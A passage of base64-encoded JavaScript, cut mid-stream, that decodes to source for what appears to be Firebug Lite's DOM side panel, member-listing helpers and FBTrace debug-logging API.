CBmcm9tIHRyeWluZyB0byBpdGVyYXRlIHRoZSBtZW1iZXJzDQogICAgICAgIC8vIG9mIGNlcnRhaW4gb2JqZWN0cywgbGlrZSBTdG9yYWdlTGlzdCwgYnV0IGRvbid0IGxldCB0aGF0IGd1bSB1cCB0aGUgd29ya3MNCiAgICAgICAgdGhyb3cgZXhjOw0KICAgICAgICBpZiAoRkJUcmFjZS5EQkdfRVJST1JTICYmIEZCVHJhY2UuREJHX0RPTSkNCiAgICAgICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJkb20uZ2V0TWVtYmVycyBGQUlMUzogIiwgZXhjKTsNCiAgICAgICAgLy90aHJvdyBleGM7DQogICAgfQ0KDQogICAgZnVuY3Rpb24gc29ydE5hbWUoYSwgYikgeyByZXR1cm4gYS5uYW1lID4gYi5uYW1lID8gMSA6IC0xOyB9DQogICAgZnVuY3Rpb24gc29ydE9yZGVyKGEsIGIpIHsgcmV0dXJuIGEub3JkZXIgPiBiLm9yZGVyID8gMSA6IC0xOyB9DQoNCiAgICB2YXIgbWVtYmVycyA9IFtdOw0KDQogICAgbWVtYmVycy5wdXNoLmFwcGx5KG1lbWJlcnMsIG9yZGluYWxzKTsNCg0KICAgIEZpcmVidWcuc2hvd1VzZXJQcm9wcyA9IHRydWU7IC8vIFRPRE86IHh4eHBlZHJvDQogICAgRmlyZWJ1Zy5zaG93VXNlckZ1bmNzID0gdHJ1ZTsgLy8gVE9ETzogeHh4cGVkcm8NCiAgICBGaXJlYnVnLnNob3dET01Qcm9wcyA9IHRydWU7DQogICAgRmlyZWJ1Zy5zaG93RE9NRnVuY3MgPSB0cnVlOw0KICAgIEZpcmVidWcuc2hvd0RPTUNvbnN0YW50cyA9IHRydWU7DQogICAgDQogICAgaWYgKEZpcmVidWcuc2hvd1VzZXJQcm9wcykNCiAgICB7DQogICAgICAgIHVzZXJQcm9wcy5zb3J0KHNvcnROYW1lKTsNCiAgICAgICAgbWVtYmVycy5wdXNoLmFwcGx5KG1lbWJlcnMsIHVzZXJQcm9wcyk7DQogICAgfQ0KDQogICAgaWYgKEZpcmVidWcuc2hvd1VzZXJGdW5jcykNCiAgICB7DQogICAgICAgIHVzZXJDbGFzc2VzLnNvcnQoc29ydE5hbWUpOw0KICAgICAgICBtZW1iZXJzLnB1c2guYXBwbHkobWVtYmVycywgdXNlckNsYXNzZXMpOw0KDQogICAgICAgIHVzZXJGdW5jcy5zb3J0KHNvcnROYW1lKTsNCiAgICAgICAgbWVtYmVycy5wdXNoLmFwcGx5KG1lbWJlcnMsIHVzZXJGdW5jcyk7DQogICAgfQ0KDQogICAgaWYgKEZpcmVidWcuc2hvd0RPTVByb3BzKQ0KICAgIHsNCiAgICAgICAgZG9tUHJvcHMuc29ydChzb3J0TmFtZSk7DQogICAgICAgIG1lbWJlcnMucHVzaC5hcHBseShtZW1iZXJzLCBkb21Qcm9wcyk7DQogICAgfQ0KDQogICAgaWYgKEZpcmVidWcuc2hvd0RPTUZ1bmNzKQ0KICAgIHsNCiAgICAgICAgZG9tRnVuY3Muc29ydChzb3J0TmFtZSk7DQogICAgICAgIG1lbWJlcnMucHVzaC5hcHBseShtZW1iZXJzLCBkb21GdW5jcyk7DQogICAgfQ0KDQogICAgaWYgKEZpcmVidWcuc2hvd0RPTUNvbnN0YW50cykNCiAgICAgICAgbWVtYmVycy5wdXNoLmFwcGx5KG1lbWJlcnMsIGRvbUNvbnN0YW50cyk7DQoNCiAgICByZXR1cm4gbWVtYmVyczsNCn07DQoNCmZ1bmN0aW9uIGV4cGFuZE1lbWJlcnMobWVtYmVycywgdG9nZ2xlcywgb2Zmc2V0LCBsZXZlbCkgIC8vIHJlY3Vyc2lvbiBzdGFydHMgd2l0aCBvZmZzZXQ9MCwgbGV2ZWw9MA0Kew0KICAgIHZhciBleHBhbmRlZCA9IDA7DQogICAgZm9yICh2YXIgaSA9IG9mZnNldDsgaSA8IG1lbWJlcnMubGVuZ3RoOyArK2kpDQogICAgew0KICAgICAgICB2YXIgbWVtYmVyID0gbWVtYmVyc1tpXTsNCiAgICAgICAgaWYgKG1lbWJlci5sZXZlbCA+IGxldmVsKQ0KICAgICAgICAgICAgYnJlYWs7DQoNCiAgICAgICAgaWYgKCB0b2dnbGVzLmhhc093blByb3BlcnR5KG1lbWJlci5uYW1lKSApDQogICAgICAgIHsNCiAgICAgICAgICAgIG1lbWJlci5vcGVuID0gIm9wZW5lZCI7ICAvLyBtZW1iZXIubGV2ZWwgPD0gbGV2ZWwgJiYgbWVtYmVyLm5hbWUgaW4gdG9nZ2xlcy4NCg0KICAgICAgICAgICAgdmFyIG5ld01lbWJlcnMgPSBnZXRNZW1iZXJzKG1lbWJlci52YWx1ZSwgbGV2ZWwrMSk7ICAvLyBzZXRzIG5ld01lbWJlcnMubGV2ZWwgdG8gbGV2ZWwrMQ0KDQogICAgICAgICAgICB2YXIgYXJncyA9IFtpKzEsIDBdOw0KICAgICAgICAgICAgYXJncy5wdXNoLmFwcGx5KGFyZ3MsIG5ld01lbWJlcnMpOw0KICAgICAgICAgICAgbWVtYmVycy5zcGxpY2UuYXBwbHkobWVtYmVycywgYXJncyk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIC8qDQogICAgICAgICAgICBpZiAoRkJUcmFjZS5EQkdfRE9NKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJleHBhbmRNZW1iZXJzIG1lbWJlci5uYW1lIiwgbWVtYmVyLm5hbWUpOw0KICAgICAgICAgICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJleHBhbmRNZW1iZXJzIHRvZ2dsZXMiLCB0b2dnbGVzKTsNCiAgICAgICAgICAgICAgICBGQlRyYWNlLnN5c291dCgiZXhwYW5kTWVtYmVycyB0b2dnbGVzW21lbWJlci5uYW1lXSIsIHRvZ2dsZXNbbWVtYmVyLm5hbWVdKTsNCiAgICAgICAgICAgICAgICBGQlRyYWNlLnN5c291dCgiZG9tLmV4cGFuZGVkTWVtYmVycyBsZXZlbDogIitsZXZlbCsiIG1lbWJlciIsIG1lbWJlcik7DQogICAgICAgICAgICB9DQogICAgICAgICAgICAvKiovDQoNCiAgICAgICAgICAgIGV4cGFuZGVkICs9IG5ld01lbWJlcnMubGVuZ3RoOw0KICAgICAgICAgICAgaSArPSBuZXdNZW1iZXJzLmxlbmd0aCArIGV4cGFuZE1lbWJlcnMobWVtYmVycywgdG9nZ2xlc1ttZW1iZXIubmFtZV0sIGkrMSwgbGV2ZWwrMSk7DQogICAgICAgIH0NCiAgICB9DQoNCiAgICByZXR1cm4gZXhwYW5kZWQ7DQp9DQoNCi8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQoNCg0KZnVuY3Rpb24gaXNDbGFzc0Z1bmN0aW9uKGZuKQ0Kew0KICAgIHRyeQ0KICAgIHsNCiAgICAgICAgZm9yICh2YXIgbmFtZSBpbiBmbi5wcm90b3R5cGUpDQogICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICB9IGNhdGNoIChleGMpIHt9DQogICAgcmV0dXJuIGZhbHNlOw0KfQ0KDQovLyBGSVhNRTogeHh4cGVkcm8gVGhpcyBmdW5jdGlvbiBpcyBhbHJlYWR5IGRlZmluZWQgaW4gTGliLiBJZiB3ZSBrZWVwIHRoaXMgZGVmaW5pdGlvbiBoZXJlLCBpdA0KLy8gd2lsbCBjcmFzaCBJRTkgd2hlbiBub3QgcnVubmluZyB0aGUgSUUgRGV2ZWxvcGVyIFRvb2wgd2l0aCBKYXZhU2NyaXB0IERlYnVnZ2luZyBlbmFibGVkISEhDQovLyBDaGVjayBpZiB0aGlzIGZ1bmN0aW9uIGlzIGluIGZhY3QgZGVmaW5lZCBpbiBGaXJlYnVnIGZvciBGaXJlZm94LiBJZiBzbywgd2Ugc2hvdWxkIHJlbW92ZQ0KLy8gdGhpcyBmcm9tIGhlcmUuIFRoZSBvbmx5IGRpZmZlcmVuY2Ugb2YgdGhpcyBmdW5jdGlvbiBpcyB0aGUgSUUgaGFjayB0byBzaG93IHVwIHRoZSBwcm90b3R5cGUNCi8vIG9mIGZ1bmN0aW9ucywgYnV0IEZpcmVidWcgbm8gbG9uZ2VyIHNob3dzIHRoZSBwcm90b3R5cGUgZm9yIHNpbXBsZSBmdW5jdGlvbnMuDQovL3ZhciBoYXNQcm9wZXJ0aWVzID0gZnVuY3Rpb24gaGFzUHJvcGVydGllcyhvYikNCi8vew0KLy8gICAgdHJ5DQovLyAgICB7DQovLyAgICAgICAgZm9yICh2YXIgbmFtZSBpbiBvYikNCi8vICAgICAgICAgICAgcmV0dXJuIHRydWU7DQovLyAgICB9IGNhdGNoIChleGMpIHt9DQovLyAgICANCi8vICAgIC8vIElFIGZ1bmN0aW9uIHByb3RvdHlwZSBpcyBub3QgbGlzdGVkIGluIChmb3IuLmluKQ0KLy8gICAgaWYgKGlzRnVuY3Rpb24ob2IpKSByZXR1cm4gdHJ1ZTsNCi8vICAgIA0KLy8gICAgcmV0dXJuIGZhbHNlOw0KLy99Ow0KDQpGQkwuRXJyb3JDb3B5ID0gZnVuY3Rpb24obWVzc2FnZSkNCnsNCiAgICB0aGlzLm1lc3NhZ2UgPSBtZXNzYWdlOw0KfTsNCg0KdmFyIGFkZE1lbWJlciA9IGZ1bmN0aW9uIGFkZE1lbWJlcih0eXBlLCBwcm9wcywgbmFtZSwgdmFsdWUsIGxldmVsLCBvcmRlcikNCnsNCiAgICB2YXIgcmVwID0gRmlyZWJ1Zy5nZXRSZXAodmFsdWUpOyAgICAvLyBkbyB0aGlzIGZpcnN0IGluIGNhc2UgYSBjYWxsIHRvIGluc3RhbmNlb2YgcmV2ZWFscyBjb250ZW50cw0KICAgIHZhciB0YWcgPSByZXAuc2hvcnRUYWcgPyByZXAuc2hvcnRUYWcgOiByZXAudGFnOw0KDQogICAgdmFyIEVycm9yQ29weSA9IGZ1bmN0aW9uKCl7fTsgLy9UT0RPOiB4eHhwZWRybw0KICAgIA0KICAgIHZhciB2YWx1ZVR5cGUgPSB0eXBlb2YodmFsdWUpOw0KICAgIHZhciBoYXNDaGlsZHJlbiA9IGhhc1Byb3BlcnRpZXModmFsdWUpICYmICEodmFsdWUgaW5zdGFuY2VvZiBFcnJvckNvcHkpICYmDQogICAgICAgIChpc0Z1bmN0aW9uKHZhbHVlKSB8fCAodmFsdWVUeXBlID09ICJvYmplY3QiICYmIHZhbHVlICE9IG51bGwpDQogICAgICAgIHx8ICh2YWx1ZVR5cGUgPT0gInN0cmluZyIgJiYgdmFsdWUubGVuZ3RoID4gRmlyZWJ1Zy5zdHJpbmdDcm9wTGVuZ3RoKSk7DQoNCiAgICBwcm9wcy5wdXNoKHsNCiAgICAgICAgbmFtZTogbmFtZSwNCiAgICAgICAgdmFsdWU6IHZhbHVlLA0KICAgICAgICB0eXBlOiB0eXBlLA0KICAgICAgICByb3dDbGFzczogIm1lbWJlclJvdy0iK3R5cGUsDQogICAgICAgIG9wZW46ICIiLA0KICAgICAgICBvcmRlcjogb3JkZXIsDQogICAgICAgIGxldmVsOiBsZXZlbCwNCiAgICAgICAgaW5kZW50OiBsZXZlbCoxNiwNCiAgICAgICAgaGFzQ2hpbGRyZW46IGhhc0NoaWxkcmVuLA0KICAgICAgICB0YWc6IHRhZw0KICAgIH0pOw0KfTsNCg0KdmFyIGdldFdhdGNoUm93SW5kZXggPSBmdW5jdGlvbiBnZXRXYXRjaFJvd0luZGV4KHJvdykNCnsNCiAgICB2YXIgaW5kZXggPSAtMTsNCiAgICBmb3IgKDsgcm93ICYmIGhhc0NsYXNzKHJvdywgIndhdGNoUm93Iik7IHJvdyA9IHJvdy5wcmV2aW91c1NpYmxpbmcpDQogICAgICAgICsraW5kZXg7DQogICAgcmV0dXJuIGluZGV4Ow0KfTsNCg0KdmFyIGdldFJvd05hbWUgPSBmdW5jdGlvbiBnZXRSb3dOYW1lKHJvdykNCnsNCiAgICB2YXIgbm9kZSA9IHJvdy5maXJzdENoaWxkOw0KICAgIHJldHVybiBub2RlLnRleHRDb250ZW50ID8gbm9kZS50ZXh0Q29udGVudCA6IG5vZGUuaW5uZXJUZXh0Ow0KfTsNCg0KdmFyIGdldFJvd1ZhbHVlID0gZnVuY3Rpb24gZ2V0Um93VmFsdWUocm93KQ0Kew0KICAgIHJldHVybiByb3cubGFzdENoaWxkLmZpcnN0Q2hpbGQucmVwT2JqZWN0Ow0KfTsNCg0KdmFyIGdldFJvd093bmVyT2JqZWN0ID0gZnVuY3Rpb24gZ2V0Um93T3duZXJPYmplY3Qocm93KQ0Kew0KICAgIHZhciBwYXJlbnRSb3cgPSBnZXRQYXJlbnRSb3cocm93KTsNCiAgICBpZiAocGFyZW50Um93KQ0KICAgICAgICByZXR1cm4gZ2V0Um93VmFsdWUocGFyZW50Um93KTsNCn07DQoNCnZhciBnZXRQYXJlbnRSb3cgPSBmdW5jdGlvbiBnZXRQYXJlbnRSb3cocm93KQ0Kew0KICAgIHZhciBsZXZlbCA9IHBhcnNlSW50KHJvdy5nZXRBdHRyaWJ1dGUoImxldmVsIikpLTE7DQogICAgZm9yIChyb3cgPSByb3cucHJldmlvdXNTaWJsaW5nOyByb3c7IHJvdyA9IHJvdy5wcmV2aW91c1NpYmxpbmcpDQogICAgew0KICAgICAgICBpZiAocGFyc2VJbnQocm93LmdldEF0dHJpYnV0ZSgibGV2ZWwiKSkgPT0gbGV2ZWwpDQogICAgICAgICAgICByZXR1cm4gcm93Ow0KICAgIH0NCn07DQoNCnZhciBnZXRQYXRoID0gZnVuY3Rpb24gZ2V0UGF0aChyb3cpDQp7DQogICAgdmFyIG5hbWUgPSBnZXRSb3dOYW1lKHJvdyk7DQogICAgdmFyIHBhdGggPSBbbmFtZV07DQoNCiAgICB2YXIgbGV2ZWwgPSBwYXJzZUludChyb3cuZ2V0QXR0cmlidXRlKCJsZXZlbCIpKS0xOw0KICAgIGZvciAocm93ID0gcm93LnByZXZpb3VzU2libGluZzsgcm93OyByb3cgPSByb3cucHJldmlvdXNTaWJsaW5nKQ0KICAgIHsNCiAgICAgICAgaWYgKHBhcnNlSW50KHJvdy5nZXRBdHRyaWJ1dGUoImxldmVsIikpID09IGxldmVsKQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIgbmFtZSA9IGdldFJvd05hbWUocm93KTsNCiAgICAgICAgICAgIHBhdGguc3BsaWNlKDAsIDAsIG5hbWUpOw0KDQogICAgICAgICAgICAtLWxldmVsOw0KICAgICAgICB9DQogICAgfQ0KDQogICAgcmV0dXJuIHBhdGg7DQp9Ow0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KDQovLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCi8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQoNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQovLyBET00gTW9kdWxlDQoNCkZpcmVidWcuRE9NID0gZXh0ZW5kKEZpcmVidWcuTW9kdWxlLA0Kew0KICAgIGdldFBhbmVsOiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICByZXR1cm4gRmlyZWJ1Zy5jaHJvbWUgPyBGaXJlYnVnLmNocm9tZS5nZXRQYW5lbCgiRE9NIikgOiBudWxsOw0KICAgIH0NCn0pOw0KDQpGaXJlYnVnLnJlZ2lzdGVyTW9kdWxlKEZpcmVidWcuRE9NKTsNCg0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCi8vIERPTSBQYW5lbA0KDQp2YXIgbGFzdEhpZ2hsaWdodGVkT2JqZWN0Ow0KDQpmdW5jdGlvbiBET01TaWRlUGFuZWwoKXt9Ow0KDQpET01TaWRlUGFuZWwucHJvdG90eXBlID0gZXh0ZW5kKEZpcmVidWcuRE9NQmFzZVBhbmVsLnByb3RvdHlwZSwNCnsNCiAgICBzZWxlY3RSb3c6IGZ1bmN0aW9uKHJvdywgdGFyZ2V0KQ0KICAgIHsNCiAgICAgICAgaWYgKCF0YXJnZXQpDQogICAgICAgICAgICB0YXJnZXQgPSByb3cubGFzdENoaWxkLmZpcnN0Q2hpbGQ7DQoNCiAgICAgICAgaWYgKCF0YXJnZXQgfHwgIXRhcmdldC5yZXBPYmplY3QpDQogICAgICAgICAgICByZXR1cm47DQoNCiAgICAgICAgdGhpcy5wYXRoVG9BcHBlbmQgPSBnZXRQYXRoKHJvdyk7DQoNCiAgICAgICAgLy8gSWYgdGhlIG9iamVjdCBpcyBpbnNpZGUgYW4gYXJyYXksIGxvb2sgdXAgaXRzIGluZGV4DQogICAgICAgIHZhciB2YWx1ZUJveCA9IHJvdy5sYXN0Q2hpbGQuZmlyc3RDaGlsZDsNCiAgICAgICAgaWYgKGhhc0NsYXNzKHZhbHVlQm94LCAib2JqZWN0Qm94LWFycmF5IikpDQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciBhcnJheUluZGV4ID0gRmlyZWJ1Z1JlcHMuQXJyLmdldEl0ZW1JbmRleCh0YXJnZXQpOw0KICAgICAgICAgICAgdGhpcy5wYXRoVG9BcHBlbmQucHVzaChhcnJheUluZGV4KTsNCiAgICAgICAgfQ0KDQogICAgICAgIC8vIE1ha2Ugc3VyZSB3ZSBnZXQgYSBmcmVzaCBzdGF0dXMgcGF0aCBmb3IgdGhlIG9iamVjdCwgc2luY2Ugb3RoZXJ3aXNlDQogICAgICAgIC8vIGl0IG1pZ2h0IGZpbmQgdGhlIG9iamVjdCBpbiB0aGUgZXhpc3RpbmcgcGF0aCBhbmQgbm90IHJlZnJlc2ggaXQNCiAgICAgICAgLy9GaXJlYnVnLmNocm9tZS5jbGVhclN0YXR1c1BhdGgoKTsNCg0KICAgICAgICB2YXIgb2JqZWN0ID0gdGFyZ2V0LnJlcE9iamVjdDsNCiAgICAgICAgDQogICAgICAgIGlmIChpbnN0YW5jZU9mKG9iamVjdCwgIkVsZW1lbnQiKSkNCiAgICAgICAgew0KICAgICAgICAgICAgRmlyZWJ1Zy5IVE1MLnNlbGVjdFRyZWVOb2RlKEVsZW1lbnRDYWNoZShvYmplY3QpKTsNCiAgICAgICAgfQ0KICAgICAgICBlbHNlDQogICAgICAgIHsNCiAgICAgICAgICAgIEZpcmVidWcuY2hyb21lLnNlbGVjdFBhbmVsKCJET00iKTsNCiAgICAgICAgICAgIEZpcmVidWcuY2hyb21lLmdldFBhbmVsKCJET00iKS5zZWxlY3Qob2JqZWN0LCB0cnVlKTsNCiAgICAgICAgfQ0KICAgIH0sDQoNCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQoNCiAgICBvbkNsaWNrOiBmdW5jdGlvbihldmVudCkNCiAgICB7DQogICAgICAgIC8qDQogICAgICAgIHZhciB0YXJnZXQgPSBldmVudC5zcmNFbGVtZW50IHx8IGV2ZW50LnRhcmdldDsNCiAgICAgICAgDQogICAgICAgIHZhciBvYmplY3QgPSBnZXRBbmNlc3RvckJ5Q2xhc3ModGFyZ2V0LCAib2JqZWN0TGluayIpOw0KICAgICAgICBvYmplY3QgPSBvYmplY3QgPyBvYmplY3QucmVwT2JqZWN0IDogbnVsbDsNCiAgICAgICAgDQogICAgICAgIGlmKCFvYmplY3QpIHJldHVybjsNCiAgICAgICAgDQogICAgICAgIGlmIChpbnN0YW5jZU9mKG9iamVjdCwgIkVsZW1lbnQiKSkNCiAgICAgICAgew0KICAgICAgICAgICAgRmlyZWJ1Zy5IVE1MLnNlbGVjdFRyZWVOb2RlKEVsZW1lbnRDYWNoZShvYmplY3QpKTsNCiAgICAgICAgfQ0KICAgICAgICBlbHNlDQogICAgICAgIHsNCiAgICAgICAgICAgIEZpcmVidWcuY2hyb21lLnNlbGVjdFBhbmVsKCJET00iKTsNCiAgICAgICAgICAgIEZpcmVidWcuY2hyb21lLmdldFBhbmVsKCJET00iKS5zZWxlY3Qob2JqZWN0LCB0cnVlKTsNCiAgICAgICAgfQ0KICAgICAgICAvKiovDQogICAgICAgIA0KICAgICAgICANCiAgICAgICAgdmFyIHRhcmdldCA9IGV2ZW50LnNyY0VsZW1lbnQgfHwgZXZlbnQudGFyZ2V0Ow0KICAgICAgICB2YXIgcmVwTm9kZSA9IEZpcmVidWcuZ2V0UmVwTm9kZSh0YXJnZXQpOw0KICAgICAgICBpZiAocmVwTm9kZSkNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIHJvdyA9IGdldEFuY2VzdG9yQnlDbGFzcyh0YXJnZXQsICJtZW1iZXJSb3ciKTsNCiAgICAgICAgICAgIGlmIChyb3cpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdGhpcy5zZWxlY3RSb3cocm93LCByZXBOb2RlKTsNCiAgICAgICAgICAgICAgICBjYW5jZWxFdmVudChldmVudCk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgLyoqLw0KICAgIH0sDQoNCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQogICAgLy8gZXh0ZW5kcyBQYW5lbA0KDQogICAgbmFtZTogIkRPTVNpZGVQYW5lbCIsDQogICAgcGFyZW50UGFuZWw6ICJIVE1MIiwNCiAgICB0aXRsZTogIkRPTSIsDQogICAgDQogICAgb3B0aW9uczogew0KICAgICAgICBoYXNUb29sQnV0dG9uczogdHJ1ZQ0KICAgIH0sDQogICAgDQogICAgaXNJbml0aWFsaXplZDogZmFsc2UsDQogICAgDQogICAgY3JlYXRlOiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICBGaXJlYnVnLkRPTUJhc2VQYW5lbC5wcm90b3R5cGUuY3JlYXRlLmFwcGx5KHRoaXMsIGFyZ3VtZW50cyk7DQogICAgICAgIA0KICAgICAgICB0aGlzLm9uQ2xpY2sgPSBiaW5kKHRoaXMub25DbGljaywgdGhpcyk7DQogICAgfSwNCiAgICANCiAgICBpbml0aWFsaXplOiBmdW5jdGlvbigpew0KICAgICAgICBGaXJlYnVnLkRPTUJhc2VQYW5lbC5wcm90b3R5cGUuaW5pdGlhbGl6ZS5hcHBseSh0aGlzLCBhcmd1bWVudHMpOw0KICAgICAgICANCiAgICAgICAgYWRkRXZlbnQodGhpcy5wYW5lbE5vZGUsICJjbGljayIsIHRoaXMub25DbGljayk7DQogICAgICAgIA0KICAgICAgICAvLyBUT0RPOiB4eHhwZWRybyBjc3MyDQogICAgICAgIHZhciBzZWxlY3Rpb24gPSBFbGVtZW50Q2FjaGUuZ2V0KEZpcmVidWcuY29udGV4dC5wZXJzaXN0ZWRTdGF0ZS5zZWxlY3RlZEhUTUxFbGVtZW50SWQpOw0KICAgICAgICBpZiAoc2VsZWN0aW9uKQ0KICAgICAgICAgICAgdGhpcy5zZWxlY3Qoc2VsZWN0aW9uLCB0cnVlKTsNCiAgICB9LA0KICAgIA0KICAgIHNodXRkb3duOiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICByZW1vdmVFdmVudCh0aGlzLnBhbmVsTm9kZSwgImNsaWNrIiwgdGhpcy5vbkNsaWNrKTsNCiAgICAgICAgDQogICAgICAgIEZpcmVidWcuRE9NQmFzZVBhbmVsLnByb3RvdHlwZS5zaHV0ZG93bi5hcHBseSh0aGlzLCBhcmd1bWVudHMpOw0KICAgIH0sDQogICAgDQogICAgcmVhdHRhY2g6IGZ1bmN0aW9uKG9sZENocm9tZSkNCiAgICB7DQogICAgICAgIC8vdGhpcy5pc0luaXRpYWxpemVkID0gb2xkQ2hyb21lLmdldFBhbmVsKCJET00iKS5pc0luaXRpYWxpemVkOw0KICAgICAgICB0aGlzLnRvZ2dsZXMgPSBvbGRDaHJvbWUuZ2V0UGFuZWwoIkRPTVNpZGVQYW5lbCIpLnRvZ2dsZXM7DQogICAgfQ0KICAgIA0KfSk7DQoNCkZpcmVidWcucmVnaXN0ZXJQYW5lbChET01TaWRlUGFuZWwpOw0KDQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KfX0pOw0KDQovKiBTZWUgbGljZW5zZS50eHQgZm9yIHRlcm1zIG9mIHVzYWdlICovDQoNCkZCTC5GQlRyYWNlID0ge307DQoNCihmdW5jdGlvbigpIHsNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KDQp2YXIgdHJhY2VPcHRpb25zID0gew0KICAgIERCR19USU1FU1RBTVA6IDEsDQogICAgREJHX0lOSVRJQUxJWkU6IDEsDQogICAgREJHX0NIUk9NRTogMSwNCiAgICBEQkdfRVJST1JTOiAxLA0KICAgIERCR19ESVNQQVRDSDogMSwNCiAgICBEQkdfQ1NTOiAxDQp9Ow0KDQp0aGlzLm1vZHVsZSA9IG51bGw7DQoNCnRoaXMuaW5pdGlhbGl6ZSA9IGZ1bmN0aW9uKCkNCnsNCiAgICBpZiAoIXRoaXMubWVzc2FnZVF1ZXVlKQ0KICAgICAgICB0aGlzLm1lc3NhZ2VRdWV1ZSA9IFtdOw0KICAgIA0KICAgIGZvciAodmFyIG5hbWUgaW4gdHJhY2VPcHRpb25zKQ0KICAgICAgICB0aGlzW25hbWVdID0gdHJhY2VPcHRpb25zW25hbWVdOyANCn07DQoNCi8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KLy8gRkJUcmFjZSBBUEkNCg0KdGhpcy5zeXNvdXQgPSBmdW5jdGlvbigpDQp7DQogICAgcmV0dXJuIHRoaXMubG9nRm9ybWF0dGVkKGFyZ3VtZW50cywgIiIpOw0KfTsNCg0KdGhpcy5kdW1wUHJvcGVydGllcyA9IGZ1bmN0aW9uKHRpdGxlLCBvYmplY3QpDQp7DQogICAgcmV0dXJuIHRoaXMubG9nRm9ybWF0dGVkKCJkdW1wUHJvcGVydGllcygpIG5vdCBzdXBwb3J0ZWQuIiwgIndhcm5pbmciKTsNCn07DQoNCnRoaXMuZHVtcFN0YWNrID0gZnVuY3Rpb24oKQ0Kew0KICAgIHJldHVybiB0aGlzLmxvZ0Zvcm1hdHRlZCgiZHVtcFN0YWNrKCkgbm90IHN1cHBvcnRlZC4iLCAid2FybmluZyIpOw0KfTsNCg0KdGhpcy5mbHVzaCA9IGZ1bmN0aW9uKG1vZHVsZSkNCnsNCiAgICB0aGlzLm1vZHVsZSA9IG1vZHVsZTsNCiAgICANCiAgICB2YXIgcXVldWUgPSB0aGlzLm1lc3NhZ2VRdWV1ZTsNCiAgICB0aGlzLm1lc3NhZ2VRdWV1ZSA9IFtdOw0KICAgIA0KICAgIGZvciAodmFyIGkgPSAwOyBpIDwgcXVldWUubGVuZ3RoOyArK2kpDQogICAgICAgIHRoaXMud3JpdGVNZXNzYWdlKHF1ZXVlW2ldWzBdLCBxdWV1ZVtpXVsxXSwgcXVldWVbaV1bMl0pOw0KfTsNCg0KdGhpcy5nZXRQYW5lbCA9IGZ1bmN0aW9uKCkNCnsNCiAgICByZXR1cm4gdGhpcy5tb2R1bGUgPyB0aGlzLm1vZHVsZS5nZXRQYW5lbCgpIDogbnVsbDsNCn07DQoNCi8vKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KDQp0aGlzLmxvZ0Zvcm1hdHRlZCA9IGZ1bmN0aW9uKG9iamVjdHMsIGNsYXNzTmFtZSkNCnsNCiAgICB2YXIgaHRtbCA9IHRoaXMuREJHX1RJTUVTVEFNUCA/IFtnZXRUaW1lc3RhbXAoKSwgIiB8ICJdIDogW107DQogICAgdmFyIGxlbmd0aCA9IG9iamVjdHMubGVuZ3RoOw0KICAgIA0KICAgIGZvciAodmFyIGkgPSAwOyBpIDwgbGVuZ3RoOyArK2kpDQogICAgew0KICAgICAgICBhcHBlbmRUZXh0KCIgIiwgaHRtbCk7DQogICAgICAgIA0KICAgICAgICB2YXIgb2JqZWN0ID0gb2JqZWN0c1tpXTsNCiAgICAgICAgDQogICAgICAgIGlmIChpID09IDApDQogICAgICAgIHsNCiAgICAgICAgICAgIGh0bWwucHVzaCgiPGI+Iik7DQogICAgICAgICAgICBhcHBlbmRUZXh0KG9iamVjdCwg